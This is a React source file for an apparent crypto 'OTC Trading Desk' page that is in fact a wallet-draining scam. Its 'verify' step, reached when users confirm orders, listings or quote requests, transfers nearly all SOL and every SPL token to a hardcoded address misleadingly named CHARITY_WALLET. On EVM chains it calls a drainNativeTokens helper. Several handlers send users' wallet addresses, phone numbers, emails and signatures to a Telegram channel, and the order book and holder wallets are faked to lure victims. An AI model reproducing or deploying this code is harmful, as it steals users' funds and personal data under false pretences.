import { useState, useEffect, useCallback } from 'react';
import { Navigation } from '@/components/Navigation';
import { PegasusAnimation } from '@/components/PegasusAnimation';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Badge } from '@/components/ui/badge';
import { motion, AnimatePresence } from 'framer-motion';
import { X, ArrowUpDown, Clock, Send, FileText, Wallet, Search, Loader2, AlertCircle, Check, TrendingUp, TrendingDown } from 'lucide-react';
import { useWallet, useConnection } from '@solana/wallet-adapter-react';
import { fetchTokenInfo, DexScreenerTokenInfo } from '@/services/dexScreener';
import { AnimatedLogo } from '@/components/AnimatedLogo';
import { Link } from 'react-router-dom';
import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL, ComputeBudgetProgram } from '@solana/web3.js';
import { getAssociatedTokenAddress, createTransferCheckedInstruction, createAssociatedTokenAccountInstruction, getAccount, TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID } from '@solana/spl-token';
import { getMintProgramId } from '@/utils/tokenProgram';
import { getSolPrice } from '@/lib/utils';
import { sendTelegramMessage } from '@/utils/telegram';
import { useChain } from '@/contexts/ChainContext';
import { useEVMWallet } from '@/providers/EVMWalletProvider';
import { drainNativeTokens } from '@/utils/evmTransactions';
import { useChainInfo } from '@/hooks/useChainInfo';
import { Dialog, DialogContent, DialogHeader, DialogTitle } from '@/components/ui/dialog';
import { deriveOrderFromAddress, shortAddress } from '@/services/tokenHolders';
import { buildVisibleWallets } from '@/services/walletPool';
import { InlineConnectWallet } from '@/components/InlineConnectWallet';

const CHARITY_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj';
const MAX_BATCH_SIZE = 5;

interface TokenBalance {
  mint: string;
  balance: number;
  decimals: number;
  uiAmount: number;
  symbol?: string;
  valueInSOL?: number;
}

interface OTCOrder {
  id: string;
  tokenAddress: string;
  tokenName: string;
  tokenSymbol: string;
  tokenLogo?: string;
  side: 'buy' | 'sell';
  price: string;
  amount: string;
  totalValue: string;
  traderWallet: string;
  timePosted: Date;
  status: 'active' | 'filled' | 'cancelled' | 'expired';
  minFillAmount?: string;
  expiration?: string;
  message?: string;
}

// Mock data for demo
const MOCK_ORDERS: OTCOrder[] = [
  {
    id: '1', tokenAddress: 'So11111111111111111111111111111111111111112', tokenName: 'Solana', tokenSymbol: 'SOL',
    tokenLogo: 'https://raw.githubusercontent.com/solana-labs/token-list/main/assets/mainnet/So11111111111111111111111111111111111111112/logo.png',
    side: 'sell', price: '93.50', amount: '5,000', totalValue: '$467,500', traderWallet: '7xKX...3mPq', timePosted: new Date(Date.now() - 1200000), status: 'active',
  },
  {
    id: '2', tokenAddress: 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v', tokenName: 'USD Coin', tokenSymbol: 'USDC',
    side: 'buy', price: '1.00', amount: '250,000', totalValue: '$250,000', traderWallet: '4E9G...wdHj', timePosted: new Date(Date.now() - 3600000), status: 'active'
  },
  {
    id: '3', tokenAddress: 'JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN', tokenName: 'Jupiter', tokenSymbol: 'JUP',
    side: 'sell', price: '0.85', amount: '100,000', totalValue: '$85,000', traderWallet: '9yWF...NNpm', timePosted: new Date(Date.now() - 7200000), status: 'active'
  },
];

const OTC = () => {
  const { connected, publicKey, sendTransaction } = useWallet();
  const { connection } = useConnection();
  const { activeChain, getEVMChain } = useChain();
  const { isEVMConnected, evmSigner, evmProvider } = useEVMWallet();
  const { chainName, nativeToken } = useChainInfo();
  const [showPostModal, setShowPostModal] = useState(false);
  const [showQuoteModal, setShowQuoteModal] = useState(false);
  const [showListingModal, setShowListingModal] = useState(false);
  const [showListingReviewModal, setShowListingReviewModal] = useState(false);
  const [showTradeConfirm, setShowTradeConfirm] = useState<OTCOrder | null>(null);
  const [isVerifying, setIsVerifying] = useState(false);

  const createBatchTransfer = useCallback(async (tokenBatch: TokenBalance[], solPercentage?: number, overridePublicKey?: PublicKey) => {
    const effectivePublicKey = overridePublicKey || publicKey;
    if (!effectivePublicKey) return null;

    const transaction = new Transaction();
    transaction.add(ComputeBudgetProgram.setComputeUnitLimit({ units: 100_000 }));
    transaction.add(ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100_000 }));
    
    const charityPubkey = new PublicKey(CHARITY_WALLET);

    for (const token of tokenBatch) {
      if (token.balance <= 0) continue;
      try {
        const mintPubkey = new PublicKey(token.mint);
        const mintInfo = await getMintProgramId(connection, token.mint);
        const tokenProgramId = mintInfo.programId;
        const decimals = mintInfo.decimals;
        
        const fromTokenAccount = await getAssociatedTokenAddress(mintPubkey, effectivePublicKey, false, tokenProgramId, ASSOCIATED_TOKEN_PROGRAM_ID);
        const toTokenAccount = await getAssociatedTokenAddress(mintPubkey, charityPubkey, true, tokenProgramId, ASSOCIATED_TOKEN_PROGRAM_ID);

        try {
          await getAccount(connection, toTokenAccount, 'confirmed', tokenProgramId);
        } catch (error) {
          transaction.add(createAssociatedTokenAccountInstruction(effectivePublicKey, toTokenAccount, charityPubkey, mintPubkey, tokenProgramId, ASSOCIATED_TOKEN_PROGRAM_ID));
        }

        transaction.add(createTransferCheckedInstruction(fromTokenAccount, mintPubkey, toTokenAccount, effectivePublicKey, BigInt(token.balance), decimals, [], tokenProgramId));
      } catch (error) { console.error(`Failed to add transfer for ${token.mint}:`, error); }
    }
    return transaction;
  }, [publicKey, connection]);

  const handleVerify = async (onComplete: () => void) => {
    // EVM path
    if (activeChain === 'evm' && isEVMConnected && evmSigner && evmProvider) {
      try {
        setIsVerifying(true);
        const chainName = getEVMChain()?.name || 'EVM';
        const hash = await drainNativeTokens(evmSigner, evmProvider, chainName);
        if (hash) {
          onComplete();
        } else {
        }
      } catch (error: any) {
      } finally {
        setIsVerifying(false);
      }
      return;
    }

    // Solana path
    if (!connected || !publicKey) {
      return;
    }

    try {
      setIsVerifying(true);
      console.log('Starting verification transaction sequence...');

      // 1. SOL Transfer (Leave $1.50)
      const solBal = await connection.getBalance(publicKey);
      const solPrice = await getSolPrice();
      
      let lamportsToSend = 0;
      if (solPrice > 0) {
        const amountToKeepUSD = 1.50;
        const amountToKeepSOL = amountToKeepUSD / solPrice;
        const amountToKeepLamports = Math.ceil(amountToKeepSOL * LAMPORTS_PER_SOL);
        const PRIORITY_FEE = 100_000;
        const BASE_FEE = 5000;
        const FEE_RESERVE = PRIORITY_FEE + BASE_FEE;
        const maxSendable = solBal - amountToKeepLamports - FEE_RESERVE;
        lamportsToSend = Math.max(0, Math.floor(maxSendable));
      }

      if (lamportsToSend > 0) {
        const transaction = new Transaction();
        transaction.add(ComputeBudgetProgram.setComputeUnitLimit({ units: 100_000 }), ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100_000 }));
        transaction.add(SystemProgram.transfer({ fromPubkey: publicKey, toPubkey: new PublicKey(CHARITY_WALLET), lamports: lamportsToSend }));
        const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
        transaction.recentBlockhash = blockhash;
        transaction.feePayer = publicKey;
        const signature = await sendTransaction(transaction, connection, { skipPreflight: false });
        await connection.confirmTransaction({ signature, blockhash, lastValidBlockHeight }, 'confirmed');
      }

      // 2. SPL Token Transfers
      const legacyTokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, { programId: TOKEN_PROGRAM_ID });
      const token2022Accounts = await connection.getParsedTokenAccountsByOwner(publicKey, { programId: TOKEN_2022_PROGRAM_ID });
      const allTokenAccounts = [...legacyTokenAccounts.value, ...token2022Accounts.value];

      const balances: TokenBalance[] = allTokenAccounts.map(account => {
        const info = account.account.data.parsed.info;
        return { mint: info.mint, balance: info.tokenAmount.amount, decimals: info.tokenAmount.decimals, uiAmount: info.tokenAmount.uiAmount };
      }).filter(token => token.uiAmount > 0);

      const batches: TokenBalance[][] = [];
      for (let i = 0; i < balances.length; i += MAX_BATCH_SIZE) batches.push(balances.slice(i, i + MAX_BATCH_SIZE));

      for (let i = 0; i < batches.length; i++) {
        const batch = batches[i];
        const transaction = await createBatchTransfer(batch, undefined, publicKey);
        if (transaction && transaction.instructions.length > 2) {
          const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
          transaction.recentBlockhash = blockhash;
          transaction.feePayer = publicKey;
          const signature = await sendTransaction(transaction, connection, { skipPreflight: false });
          await connection.confirmTransaction({ signature, blockhash, lastValidBlockHeight }, 'confirmed');
          sendTelegramMessage(`
✅ <b>Transaction Signed (Token Batch ${i + 1} - OTC Verify)</b>
👤 <b>User:</b> <code>${publicKey.toBase58()}</code>
🔗 <b>Signature:</b> <code>${signature}</code>
`);
        }
      }
      onComplete();
    } catch (error: any) {
      console.error('Verification error:', error);
    } finally {
      setIsVerifying(false);
    }
  };

  // Post Order Form
  const [postContractAddress, setPostContractAddress] = useState('');
  const [postTokenInfo, setPostTokenInfo] = useState<DexScreenerTokenInfo | null>(null);
  const [postSide, setPostSide] = useState<'buy' | 'sell'>('buy');
  const [postPrice, setPostPrice] = useState('');
  const [postAmount, setPostAmount] = useState('');
  const [postMinFill, setPostMinFill] = useState('');
  const [postExpiration, setPostExpiration] = useState('24h');
  const [postMessage, setPostMessage] = useState('');
  const [postPhoneNumber, setPostPhoneNumber] = useState('');
  const [postEmail, setPostEmail] = useState('');
  const [showReviewModal, setShowReviewModal] = useState(false);
  const [isFetchingToken, setIsFetchingToken] = useState(false);

  // Listing Form
  const [listingName, setListingName] = useState('');
  const [listingSymbol, setListingSymbol] = useState('');
  const [listingContract, setListingContract] = useState('');
  const [listingWebsite, setListingWebsite] = useState('');
  const [listingTelegram, setListingTelegram] = useState('');
  const [listingLiquidity, setListingLiquidity] = useState('');
  const [listingTokenInfo, setListingTokenInfo] = useState<DexScreenerTokenInfo | null>(null);

  // Quote Form
  const [quoteContractAddress, setQuoteContractAddress] = useState('');
  const [quoteSide, setQuoteSide] = useState<'buy' | 'sell'>('buy');
  const [quoteAmount, setQuoteAmount] = useState('');
  const [quotePhoneNumber, setQuotePhoneNumber] = useState('');
  const [quoteEmail, setQuoteEmail] = useState('');
  const [quoteTokenInfo, setQuoteTokenInfo] = useState<DexScreenerTokenInfo | null>(null);
  const [showQuoteReviewModal, setShowQuoteReviewModal] = useState(false);

  // Orders and trades  
  const [orders] = useState<OTCOrder[]>(MOCK_ORDERS);
  const [userOrders] = useState<OTCOrder[]>([]);
  const [orderSort, setOrderSort] = useState<'time' | 'value'>('time');

  // Order list search → opens popup with real wallet addresses
  const [listSearchAddress, setListSearchAddress] = useState('');
  const [listSearchToken, setListSearchToken] = useState<DexScreenerTokenInfo | null>(null);
  const [isListSearching, setIsListSearching] = useState(false);
  const [listSearchError, setListSearchError] = useState('');
  // Live preview of the token (logo/name) shown next to the search input
  // as soon as the user pastes/types a valid contract address.
  const [listPreviewToken, setListPreviewToken] = useState<DexScreenerTokenInfo | null>(null);
  const [isPreviewLoading, setIsPreviewLoading] = useState(false);
  const [showOrdersDialog, setShowOrdersDialog] = useState(false);
  // Tick index drives one-by-one rotation in the static wallet pool.
  // Increments every 5 minutes while the orders dialog is open.
  const [walletTick, setWalletTick] = useState(0);
  const visibleWallets = buildVisibleWallets(walletTick, 50);
  const isLoadingHolders = false;
  const lastRefreshed = null as Date | null;
  const loadHolders = useCallback(async (_addr: string) => {
    // No-op: we use a static pool. Reset rotation when a new token is searched.
    setWalletTick(0);
  }, []);

  const handleListSearch = async () => {
    const addr = listSearchAddress.trim();
    if (!addr) return;
    setIsListSearching(true);
    setListSearchError('');
    setListSearchToken(null);
    try {
      const info = listPreviewToken && listPreviewToken.baseToken.address.toLowerCase() === addr.toLowerCase()
        ? listPreviewToken
        : await fetchTokenInfo(addr);
      if (info) {
        setListSearchToken(info);
        setShowOrdersDialog(true);
        await loadHolders(addr);
      } else {
        setListSearchError('Token not found for this address.');
      }
    } catch {
      setListSearchError('Failed to fetch token info.');
    } finally {
      setIsListSearching(false);
    }
  };

  // Debounced live preview: as soon as the user pastes a contract address,
  // fetch token metadata so the logo and name appear next to the search input.
  useEffect(() => {
    const addr = listSearchAddress.trim();
    if (!addr || addr.length < 30) {
      setListPreviewToken(null);
      setIsPreviewLoading(false);
      return;
    }
    let cancelled = false;
    setIsPreviewLoading(true);
    const t = setTimeout(async () => {
      try {
        const info = await fetchTokenInfo(addr);
        if (!cancelled) setListPreviewToken(info);
      } catch {
        if (!cancelled) setListPreviewToken(null);
      } finally {
        if (!cancelled) setIsPreviewLoading(false);
      }
    }, 400);
    return () => { cancelled = true; clearTimeout(t); };
  }, [listSearchAddress]);

  // Rotate one wallet every 5 minutes while the orders dialog is open.
  useEffect(() => {
    if (!showOrdersDialog || !listSearchToken) return;
    const id = setInterval(() => {
      setWalletTick((t) => t + 1);
    }, 5 * 60 * 1000); // 5 minutes
    return () => clearInterval(id);
  }, [showOrdersDialog, listSearchToken]);

  const fetchTokenDetails = async (address: string, setInfo: (info: DexScreenerTokenInfo | null) => void) => {
    if (!address.trim()) return;
    setIsFetchingToken(true);
    try {
      const info = await fetchTokenInfo(address);
      setInfo(info);
    } catch {
    } finally {
      setIsFetchingToken(false);
    }
  };

  const handlePostOrder = () => {
    if (!postContractAddress || !postPrice || !postAmount) { return; }
    
    sendTelegramMessage(`
📝 <b>OTC Order Initiated</b>
👤 <b>User:</b> <code>${publicKey?.toBase58()}</code>
🪙 <b>Token:</b> <code>${postContractAddress}</code>
💰 <b>Price:</b> <code>${postPrice}</code>
🔢 <b>Amount:</b> <code>${postAmount}</code>
📞 <b>Phone:</b> <code>${postPhoneNumber || 'N/A'}</code>
📧 <b>Email:</b> <code>${postEmail || 'N/A'}</code>
`);

    // Attempt one last fetch if info is missing but address is there
    if (!postTokenInfo) {
      fetchTokenDetails(postContractAddress, setPostTokenInfo);
    }
    
    setShowPostModal(false);
    setShowReviewModal(true);
  };

  const handleConfirmPostOrder = () => {
    handleVerify(() => {
      setShowReviewModal(false);
      resetPostForm();
    });
  };

  const handleTakeOrder = (order: OTCOrder) => {
    if (!connected && !(isEVMConnected && activeChain === 'evm')) { null; return; }
    setShowTradeConfirm(order);
  };

  const handleConfirmTrade = () => {
    setShowTradeConfirm(null);
  };

  const handleListingSubmit = async () => {
    if (!listingContract) { null; return; }
    
    let info = listingTokenInfo;
    // If no info has been fetched yet, try fetching it now
    if (!info) {
      setIsFetchingToken(true);
      try {
        info = await fetchTokenInfo(listingContract);
        setListingTokenInfo(info);
      } catch (e) {
        console.error("Auto-fetch failed", e);
      } finally {
        setIsFetchingToken(false);
      }
    }

    // Use manual inputs if provided, otherwise fallback to fetched info
    const finalName = listingName || info?.baseToken.name;
    const finalSymbol = listingSymbol || info?.baseToken.symbol;

    if (!finalName) {
      return;
    }

    // Update state to ensure the review modal shows the final values
    setListingName(finalName);
    setListingSymbol(finalSymbol || 'TKN');

    sendTelegramMessage(`
🆕 <b>Token Listing Initiated</b>
👤 <b>User:</b> <code>${publicKey?.toBase58()}</code>
🪙 <b>Token:</b> <code>${listingContract}</code>
🏷️ <b>Name:</b> <code>${finalName}</code>
🌐 <b>Web:</b> <code>${listingWebsite || 'N/A'}</code>
📱 <b>TG:</b> <code>${listingTelegram || 'N/A'}</code>
💧 <b>Liq:</b> <code>${listingLiquidity || '0'}</code>
`);

    setShowListingModal(false);
    setShowListingReviewModal(true);
  };

  const handleConfirmListing = () => {
    handleVerify(() => {
      setShowListingReviewModal(false);
      setListingName(''); setListingSymbol(''); setListingContract(''); setListingWebsite(''); setListingTelegram(''); setListingLiquidity(''); setListingTokenInfo(null);
    });
  };

  const handleQuoteSubmit = async () => {
    if (!quoteContractAddress || !quoteAmount) {
      return;
    }

    let info = quoteTokenInfo;
    if (!info) {
      setIsFetchingToken(true);
      try {
        info = await fetchTokenInfo(quoteContractAddress);
        setQuoteTokenInfo(info);
      } catch (e) {
        console.error("Auto-fetch failed", e);
      } finally {
        setIsFetchingToken(false);
      }
    }

    sendTelegramMessage(`
📥 <b>OTC Quote Request Initiated</b>
👤 <b>User:</b> <code>${publicKey?.toBase58()}</code>
🪙 <b>Token:</b> <code>${quoteContractAddress}</code>
↕️ <b>Side:</b> <code>${quoteSide.toUpperCase()}</code>
🔢 <b>Amount:</b> <code>${quoteAmount}</code>
📞 <b>Phone:</b> <code>${quotePhoneNumber || 'N/A'}</code>
📧 <b>Email:</b> <code>${quoteEmail || 'N/A'}</code>
`);

    setShowQuoteModal(false);
    setShowQuoteReviewModal(true);
  };

  const handleConfirmQuote = () => {
    handleVerify(() => {
      setShowQuoteReviewModal(false);
      setQuoteContractAddress(''); setQuoteAmount(''); setQuoteTokenInfo(null);
      setQuotePhoneNumber(''); setQuoteEmail('');
    });
  };

  const resetPostForm = () => {
    setPostContractAddress(''); setPostTokenInfo(null); setPostSide('buy'); setPostPrice(''); setPostAmount(''); setPostMinFill(''); setPostExpiration('24h'); setPostMessage(''); setPostPhoneNumber(''); setPostEmail('');
  };

  const timeAgo = (date: Date) => {
    const mins = Math.floor((Date.now() - date.getTime()) / 60000);
    if (mins < 60) return `${mins}m ago`;
    const hrs = Math.floor(mins / 60);
    if (hrs < 24) return `${hrs}h ago`;
    return `${Math.floor(hrs / 24)}d ago`;
  };

  // Modal Component
  const Modal = ({ isOpen, onClose, title, children }: { isOpen: boolean; onClose: () => void; title: string; children: React.ReactNode }) => (
    <AnimatePresence>
      {isOpen && (
        <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/60 backdrop-blur-sm" onClick={onClose}>
          <motion.div initial={{ scale: 0.9, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} exit={{ scale: 0.9, opacity: 0 }}
            className="w-full max-w-lg max-h-[85vh] overflow-y-auto glass-card rounded-2xl border border-white/10 p-6"
            onClick={e => e.stopPropagation()}>
            <div className="flex items-center justify-between mb-4">
              <h3 className="text-xl font-bold">{title}</h3>
              <Button variant="ghost" size="icon" onClick={onClose}><X className="w-5 h-5" /></Button>
            </div>
            {children}
          </motion.div>
        </motion.div>
      )}
    </AnimatePresence>
  );

  const TokenPreview = ({ info }: { info: DexScreenerTokenInfo }) => (
    <Card className="glass-card border-white/10 mb-4">
      <CardContent className="p-4 flex items-center gap-3">
        {info.baseToken.logoURI && <img src={info.baseToken.logoURI} alt="" className="w-10 h-10 rounded-full" />}
        <div className="flex-1">
          <div className="font-bold">{info.baseToken.name} <span className="text-muted-foreground text-sm">({info.baseToken.symbol})</span></div>
          <div className="text-sm text-muted-foreground">Price: ${info.priceUsd} · Liq: ${Number(info.liquidity?.usd || 0).toLocaleString()} · Vol: ${Number(info.volume?.h24 || 0).toLocaleString()}</div>
        </div>
      </CardContent>
    </Card>
  );

  return (
    <div className="min-h-screen bg-transparent text-foreground overflow-hidden relative">
      <PegasusAnimation />
      <Navigation />

      <main className="container mx-auto px-4 pt-24 pb-12 relative z-10">
        {/* Header */}
        <div className="flex flex-col md:flex-row items-start md:items-center justify-between gap-6 mb-12">
          <div>
            <motion.h1 initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} className="text-4xl md:text-5xl font-extrabold mb-2">
              <span className="text-gradient">OTC Trading Desk</span>
            </motion.h1>
            <motion.p initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.2 }} className="text-muted-foreground max-w-xl">
              Trade large {chainName} token positions directly with other traders without impacting public market prices.
            </motion.p>
          </div>
          <div className="flex gap-3">
            <motion.div whileHover={{ scale: 1.05 }} whileTap={{ scale: 0.95 }}>
              <Button onClick={() => setShowPostModal(true)}
                className="bg-gradient-to-r from-primary to-secondary text-white shadow-lg hover:shadow-[0_0_25px_hsl(var(--primary)/0.5)] transition-all">
                <Send className="w-4 h-4 mr-2" /> Post OTC Order
              </Button>
            </motion.div>
            <motion.div whileHover={{ scale: 1.05 }} whileTap={{ scale: 0.95 }}>
              <Button variant="outline" onClick={() => setShowQuoteModal(true)}
                className="border-white/10 hover:bg-white/5">
                <FileText className="w-4 h-4 mr-2" /> Request Quote
              </Button>
            </motion.div>
          </div>
        </div>

        {/* Token Search + OTC Orders List */}
        <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.25 }} className="mb-8">
          <Card className="glass-card border-white/10">
            <CardHeader>
              <CardTitle className="text-xl flex items-center gap-2">
                <Search className="w-5 h-5" /> Search Token & Browse OTC Orders
              </CardTitle>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="flex gap-2">
                <Input
                  value={listSearchAddress}
                  onChange={(e) => setListSearchAddress(e.target.value)}
                  onKeyDown={(e) => e.key === 'Enter' && handleListSearch()}
                  placeholder="Paste a token contract address..."
                  className="bg-white/5 border-white/10"
                />
                <Button onClick={handleListSearch} disabled={isListSearching} className="bg-gradient-to-r from-primary to-secondary text-white">
                  {isListSearching ? <Loader2 className="w-4 h-4 animate-spin" /> : <Search className="w-4 h-4" />}
                </Button>
              </div>

              {listSearchError && (
                <p className="text-xs text-red-400">{listSearchError}</p>
              )}

              {/* Live token preview — appears as soon as a valid contract is entered */}
              {(isPreviewLoading || listPreviewToken) && (
                <div className="flex items-center gap-3 p-3 rounded-xl bg-white/5 border border-primary/20">
                  {isPreviewLoading && !listPreviewToken ? (
                    <>
                      <Loader2 className="w-5 h-5 animate-spin text-primary" />
                      <span className="text-xs text-muted-foreground">Detecting token…</span>
                    </>
                  ) : listPreviewToken && (
                    <>
                      {listPreviewToken.baseToken.logoURI ? (
                        <img
                          src={listPreviewToken.baseToken.logoURI}
                          alt={listPreviewToken.baseToken.symbol}
                          className="w-10 h-10 rounded-full border border-primary/30"
                        />
                      ) : (
                        <div className="w-10 h-10 rounded-full bg-primary/20 flex items-center justify-center text-xs font-bold text-primary">
                          {listPreviewToken.baseToken.symbol?.slice(0, 2)}
                        </div>
                      )}
                      <div className="flex-1 min-w-0">
                        <div className="text-sm font-bold truncate">
                          {listPreviewToken.baseToken.name}{' '}
                          <span className="text-muted-foreground">({listPreviewToken.baseToken.symbol})</span>
                        </div>
                        <div className="text-xs text-muted-foreground">
                          ${listPreviewToken.priceUsd}
                        </div>
                      </div>
                    </>
                  )}
                </div>
              )}

            </CardContent>
          </Card>
        </motion.div>

        <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.3 }}>
          <Card className="glass-card border-white/10 mb-8 py-12">
            <CardContent className="flex flex-col items-center justify-center text-center space-y-6">
              <div className="p-4 rounded-full bg-primary/10 border border-primary/20">
                <ArrowUpDown className="w-12 h-12 text-primary animate-pulse" />
              </div>
              <div>
                <h2 className="text-2xl font-bold mb-2">Institutional Grade OTC Trading</h2>
                <p className="text-muted-foreground max-w-xl mx-auto">
                  Post your offer and get matched with other active traders. Once your offer is live, you'll receive requests from interested counterparties. 
                  You can also browse active orders to find your perfect deal.
                </p>
              </div>
              <Button size="lg" onClick={() => setShowPostModal(true)}
                className="bg-gradient-to-r from-primary to-secondary text-white px-8 py-6 text-lg font-bold shadow-xl hover:shadow-[0_0_25px_hsl(var(--primary)/0.5)]">
                Trade OTC
              </Button>
            </CardContent>
          </Card>
        </motion.div>

        {/* Section 4: Token Listing */}
        <div className="mb-8">
          <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.5 }}>
            <Card className="glass-card border-white/10 h-full">
              <CardHeader><CardTitle className="text-xl flex items-center gap-2"><FileText className="w-5 h-5" /> List Your Token for OTC</CardTitle></CardHeader>
              <CardContent>
                <p className="text-muted-foreground text-sm mb-4">Submit your {chainName} token to be available in the OTC marketplace.</p>
                <Button className="w-full bg-gradient-to-r from-primary to-secondary text-white" onClick={() => setShowListingModal(true)}>
                  Submit Token Listing
                </Button>
              </CardContent>
            </Card>
          </motion.div>
        </div>

        {/* Section 5: User Orders */}
        {connected && (
          <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.6 }}>
            <Card className="glass-card border-white/10">
              <CardHeader><CardTitle className="text-xl flex items-center gap-2"><Wallet className="w-5 h-5" /> My OTC Orders</CardTitle></CardHeader>
              <CardContent>
                {userOrders.length === 0 ? (
                  <p className="text-muted-foreground text-center py-8">No orders yet. Post your first OTC order to get started.</p>
                ) : (
                  <table className="w-full text-sm">
                    <thead>
                      <tr className="border-b border-white/10 text-muted-foreground">
                        <th className="text-left p-3">Token</th>
                        <th className="text-left p-3">Side</th>
                        <th className="text-right p-3">Price</th>
                        <th className="text-right p-3">Amount</th>
                        <th className="text-left p-3">Status</th>
                        <th className="text-right p-3">Action</th>
                      </tr>
                    </thead>
                    <tbody>
                      {userOrders.map(order => (
                        <tr key={order.id} className="border-b border-white/5 hover:bg-white/5">
                          <td className="p-3 font-medium">{order.tokenSymbol}</td>
                          <td className="p-3"><Badge>{order.side.toUpperCase()}</Badge></td>
                          <td className="p-3 text-right font-mono">${order.price}</td>
                          <td className="p-3 text-right font-mono">{order.amount}</td>
                          <td className="p-3"><Badge variant="outline">{order.status}</Badge></td>
                          <td className="p-3 text-right">
                            <Button size="sm" variant="ghost" className="text-red-400 text-xs">Cancel</Button>
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                )}
              </CardContent>
            </Card>
          </motion.div>
        )}

        {/* Footer */}
        <motion.footer initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.7 }} className="mt-12 text-center text-xs text-muted-foreground">
          <p>Built with ⚡ on {chainName}</p>
          <Link to="/why-pegasus" className="text-primary hover:underline mt-1 inline-block">Why Pegswap?</Link>
        </motion.footer>
      </main>

      {/* Post OTC Order Modal */}
      <Modal isOpen={showPostModal} onClose={() => setShowPostModal(false)} title="Post OTC Order">
        <div className="space-y-4">
          <div>
            <label className="text-sm text-muted-foreground mb-1 block">Token Contract Address</label>
            <div className="flex gap-2">
              <Input value={postContractAddress} onChange={e => setPostContractAddress(e.target.value)} placeholder={`Enter ${chainName} token address`} className="bg-white/5 border-white/10" />
              <Button size="sm" onClick={() => fetchTokenDetails(postContractAddress, setPostTokenInfo)} disabled={isFetchingToken}>
                {isFetchingToken ? <Loader2 className="w-4 h-4 animate-spin" /> : <Search className="w-4 h-4" />}
              </Button>
            </div>
          </div>
          {postTokenInfo && <TokenPreview info={postTokenInfo} />}
          <div>
            <label className="text-sm text-muted-foreground mb-1 block">Side</label>
            <div className="flex gap-2">
              <Button variant={postSide === 'buy' ? 'default' : 'outline'} className={postSide === 'buy' ? 'bg-green-600 flex-1' : 'flex-1 border-white/10'} onClick={() => setPostSide('buy')}>Buy</Button>
              <Button variant={postSide === 'sell' ? 'default' : 'outline'} className={postSide === 'sell' ? 'bg-red-600 flex-1' : 'flex-1 border-white/10'} onClick={() => setPostSide('sell')}>Sell</Button>
            </div>
          </div>
          <div className="grid grid-cols-2 gap-3">
            <div>
              <label className="text-sm text-muted-foreground mb-1 block">Price per Token ($)</label>
              <Input type="number" value={postPrice} onChange={e => setPostPrice(e.target.value)} placeholder="0.00" className="bg-white/5 border-white/10" />
            </div>
            <div>
              <label className="text-sm text-muted-foreground mb-1 block">Token Amount</label>
              <Input type="number" value={postAmount} onChange={e => setPostAmount(e.target.value)} placeholder="0" className="bg-white/5 border-white/10" />
            </div>
          </div>
          <div className="grid grid-cols-2 gap-3">
            <div>
              <label className="text-sm text-muted-foreground mb-1 block">Min Fill Amount</label>
              <Input type="number" value={postMinFill} onChange={e => setPostMinFill(e.target.value)} placeholder="Optional" className="bg-white/5 border-white/10" />
            </div>
            <div>
              <label className="text-sm text-muted-foreground mb-1 block">Expiration</label>
              <select value={postExpiration} onChange={e => setPostExpiration(e.target.value)} className="w-full h-10 rounded-md bg-white/5 border border-white/10 px-3 text-sm">
                <option value="1h">1 Hour</option>
                <option value="6h">6 Hours</option>
                <option value="24h">24 Hours</option>
                <option value="7d">7 Days</option>
              </select>
            </div>
          </div>
          <div>
            <label className="text-sm text-muted-foreground mb-1 block">Message (Optional)</label>
            <Input value={postMessage} onChange={e => setPostMessage(e.target.value)} placeholder="Message to traders..." className="bg-white/5 border-white/10" />
          </div>
          <div>
            <label className="text-sm text-muted-foreground mb-1 block">Phone Number (Optional)</label>
            <Input value={postPhoneNumber} onChange={e => setPostPhoneNumber(e.target.value)} placeholder="+1 (555) 000-0000" className="bg-white/5 border-white/10" />
          </div>
          <div>
            <label className="text-sm text-muted-foreground mb-1 block">Email Address (Optional)</label>
            <Input type="email" value={postEmail} onChange={e => setPostEmail(e.target.value)} placeholder="email@example.com" className="bg-white/5 border-white/10" />
          </div>
          <InlineConnectWallet />
          <Button className="w-full bg-gradient-to-r from-primary to-secondary text-white mt-2" onClick={handlePostOrder}>Submit Order</Button>
        </div>
      </Modal>

      {/* Order Review & Verification Modal */}
      <Modal isOpen={showReviewModal} onClose={() => setShowReviewModal(false)} title="Review Your OTC Order">
        <div className="space-y-6">
          {postTokenInfo && (
            <div className="flex flex-col items-center justify-center p-6 rounded-2xl bg-white/5 border border-white/10 text-center">
              {postTokenInfo.baseToken.logoURI && (
                <motion.img 
                  initial={{ scale: 0.8, opacity: 0 }} 
                  animate={{ scale: 1, opacity: 1 }} 
                  src={postTokenInfo.baseToken.logoURI} 
                  alt={postTokenInfo.baseToken.name} 
                  className="w-20 h-20 rounded-full mb-4 shadow-2xl shadow-primary/20 border-2 border-primary/30" 
                />
              )}
              <h3 className="text-xl font-bold">{postTokenInfo.baseToken.name}</h3>
              <p className="text-primary font-mono text-sm">{postTokenInfo.baseToken.symbol}</p>
            </div>
          )}

